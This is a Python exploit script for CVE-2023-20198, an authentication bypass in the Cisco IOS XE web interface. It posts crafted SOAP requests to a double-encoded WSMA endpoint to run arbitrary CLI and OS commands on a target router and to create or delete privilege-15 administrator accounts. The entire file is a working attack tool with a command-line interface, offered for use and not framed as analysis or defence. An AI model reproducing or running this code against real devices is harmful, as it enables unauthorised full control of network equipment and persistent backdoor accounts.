import re
import random
import string
import sys

import requests
import argparse
import xml.etree.ElementTree as ET

def GenerateRandTextAlpha(length):
    letters = string.ascii_letters
    return "".join(random.choice(letters) for _ in range(length))

def GetOutputResult(resp_text, cisco_method, exploit_mode):
    if exploit_mode == "user":
        return resp_text
    if cisco_method == "urn:cisco:wsma-exec":
        root = ET.fromstring(resp_text)
        namespaces = {
            "SOAP": "http://schemas.xmlsoap.org/soap/envelope/",
            "cisco": cisco_method
        }
        text_content = root.find('.//cisco:text', namespaces=namespaces)
        return text_content.text.strip()
    elif cisco_method == "urn:cisco:wsma-config":
        root = ET.fromstring(resp_text)
        namespaces = {
            "SOAP": "http://schemas.xmlsoap.org/soap/envelope/",
            "cisco": cisco_method
        }
        text_content = root.find('.//cisco:text', namespaces=namespaces)
        result = ""
        pattern = r"\*\*CLI Line # 2: (.*)"
        matches = re.findall(pattern, text_content.text.strip())
        for match in matches:
            result += match + "\n"
        return result

def RunCliCommand(url, command, proxy, exploit_mode):
    if url.startswith("https://"):
        uri = "/%2577ebui_wsma_https"
    elif url.startswith("http://"):
        uri = "/%2577ebui_wsma_Http"
    else:
        print("[x] Invalid URL. Example: http://example.com")
        return None
    target_url = url + uri
    exp_xml = f"""<?xml version="1.0"?>
	<SOAP:Envelope xmlns:SOAP="http://schemas.xmlsoap.org/soap/envelope/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
	<SOAP:Header>
	  <wsse:Security xmlns:wsse="http://schemas.xmlsoap.org/ws/2002/04/secext">
		<wsse:UsernameToken SOAP:mustUnderstand="false">
		  <wsse:Username>{GenerateRandTextAlpha(4)}</wsse:Username>
		  <wsse:Password>*****</wsse:Password>
		</wsse:UsernameToken>
	  </wsse:Security>
	</SOAP:Header>
	<SOAP:Body>
	  <request correlator="{GenerateRandTextAlpha(8)}" xmlns="urn:cisco:wsma-config">
		<configApply details="all" action-on-fail="continue">
		  <config-data>
		   <cli-config-data-block>{command}</cli-config-data-block>
		  </config-data>
		</configApply>
	  </request>
	</SOAP:Body>
</SOAP:Envelope>"""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    }
    try:
        response = requests.post(url=target_url, headers=headers, data=exp_xml, verify=False, allow_redirects=False,
                                 proxies=proxy, timeout=20)
        if response.status_code == 200:
            result = GetOutputResult(response.text, "urn:cisco:wsma-config", exploit_mode=exploit_mode)
            return result
    except:
        return None

def RunOSCommand(url, command, proxy):
    if url.startswith("https://"):
        uri = "/%2577ebui_wsma_https"
    elif url.startswith("http://"):
        uri = "/%2577ebui_wsma_Http"
    else:
        print("[x] Invalid URL. Example: http://example.com")
        return None
    target_url = url + uri
    exp_xml = f"""<?xml version="1.0"?> <SOAP:Envelope xmlns:SOAP="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"
xmlns:xsd="http://www.w3.org/2001/XMLSchema" 
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> <SOAP:Header> <wsse:Security xmlns:wsse="http://schemas.xmlsoap.org/ws/2002/04/secext"> <wsse:UsernameToken SOAP:mustUnderstand="false"> <wsse:Username>admin</wsse:Username>
<wsse:Password>*****</wsse:Password></wsse:UsernameToken></wsse:Security></SOAP:Header><SOAP:Body><request correlator="{GenerateRandTextAlpha(8)}" xmlns="urn:cisco:wsma-exec"> <execCLI xsd="false"><cmd>{command}</cmd><dialogue><expect></expect><reply></reply></dialogue></execCLI></request></SOAP:Body></SOAP:Envelope>"""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    }
    try:
        response = requests.post(url=target_url, headers=headers, data=exp_xml, verify=False, allow_redirects=False,
                                 proxies=proxy, timeout=20)
        if response.status_code == 200:
            result = GetOutputResult(response.text, "urn:cisco:wsma-exec", exploit_mode="cmd")
            return result
    except:
        return None

def AddUser(url, proxy, username, password):
    res = RunCliCommand(url=url, command=f"username {username} privilege 15 secret {password}", proxy=proxy, exploit_mode="user")
    if "<success" in res:
        print(f"[+] Add username: {username}, password: {password}")
    else:
        print(f"[-] failed to add user.")

def DeleteUser(url, proxy, username):
    res = RunCliCommand(url=url, command=f"no username {username} privilege 15", proxy=proxy, exploit_mode="user")
    if "<success" in res:
        print(f"[+] Delete username: {username}")
    else:
        print(f"[-] failed to add user.")

def ParseArgs():
    parser = argparse.ArgumentParser(description="CVE-2023-20198-RCE")
    parser.add_argument("-u", "--url", type=str, help="target url to check, eg: http://example.com", required=True)
    parser.add_argument("-p", "--proxy", type=str, default="http://127.0.0.1:8083", help="proxy url, eg: http://127.0.0.1:8083", required=False)
    parser.add_argument("-au", "--add-user", nargs="?", const="", default="", help="username to add.If left blank, an 8-digit mixed case English string will be randomly generated.", required=False)
    parser.add_argument("-ap", "--add-pass", nargs="?", const="", help="password to add.If left blank, an 8-digit mixed case English string will be randomly generated.", required=False)
    parser.add_argument("-du", "--del-user", type=str, help="username to delete", required=False)
    parser.add_argument("-pm", "--privilege-mode", type=str, help="user/privileged", required=False)
    parser.add_argument("-em", "--exploit-mode", type=str, help="user/cmd", required=False)
    parser.add_argument("-oc", "--os-cmd", type=str, help="exec os command", required=False)
    parser.add_argument("-cc", "--cli-cmd", type=str, help="exec cli command", required=False)
    return parser.parse_args()

def banner():
    banner = r"""
  ______     _______     ____   ___ ____  _____      ____   ___  _  ___   ___  
 / ___\ \   / / ____|   |___ \ / _ \___ \|___ /     |___ \ / _ \/ |/ _ \ ( _ ) 
| |    \ \ / /|  _| _____ __) | | | |__) | |_ \ _____ __) | | | | | (_) |/ _ \ 
| |___  \ V / | |__|_____/ __/| |_| / __/ ___) |_____/ __/| |_| | |\__, | (_) |
 \____|  \_/  |_____|   |_____|\___/_____|____/     |_____|\___/|_|  /_/ \___/ 
                                                            Author : W01fh4cker
                                                            Twitter : @W01fh4cker
                                                            Github : https://github.com/W01fh4cker
    """
    print(banner)

if __name__ == "__main__":
    banner()
    args = ParseArgs()
    if not args.proxy:
        proxy = {}
    else:
        proxy = {
            "http": args.proxy,
            "https": args.proxy
        }
    if args.exploit_mode == "user":
        if args.os_cmd or args.cli_cmd:
            print("[x] You specified the wrong module, it should be: -em cmd")
            sys.exit(0)
        if args.del_user:
            DeleteUser(args.url, proxy, args.del_user)
        else:
            if args.add_user and args.add_pass:
                AddUser(args.url, proxy, args.add_user, args.add_pass)
            elif args.add_user and not args.add_pass:
                AddUser(args.url, proxy, args.add_user, GenerateRandTextAlpha(8))
            elif not args.add_user and args.add_pass:
                AddUser(args.url, proxy, GenerateRandTextAlpha(8), args.add_pass)
            else:
                AddUser(args.url, proxy, GenerateRandTextAlpha(8), GenerateRandTextAlpha(8))

    elif args.exploit_mode is None:
        print("[*] Please specify the usage module (user/cmd). eg: -em user")
    else:
        if args.os_cmd:
            result = RunOSCommand(url=args.url, command=args.os_cmd, proxy=proxy)
            if result is None:
                print("[-] Failed to execute os command.")
            elif result == "":
                print("[*] The target environment is special and this command does not exist. You can try executing the \"uname -a\" command to check.")
            else:
                print(result)
        if args.cli_cmd:
            if args.privilege_mode is None:
                print("[*] Please specify the usage module (user/privileged). eg: -pm privileged")
                sys.exit(0)
            if args.privilege_mode == "user":
                command = f"<![CDATA[exit\nexit\n{args.cli_cmd}]]>"
            else:
                command = f"<![CDATA[exit\n{args.cli_cmd}]]>"
            result = RunCliCommand(url=args.url, command=command, proxy=proxy, exploit_mode="cmd")
            if result is None:
                print("[-] Failed to execute cli command.")
            elif result == "":
                print("[*] The target environment is special and this command does not exist. You can try executing the \"show version\" command to check.")
            else:
                print(result)
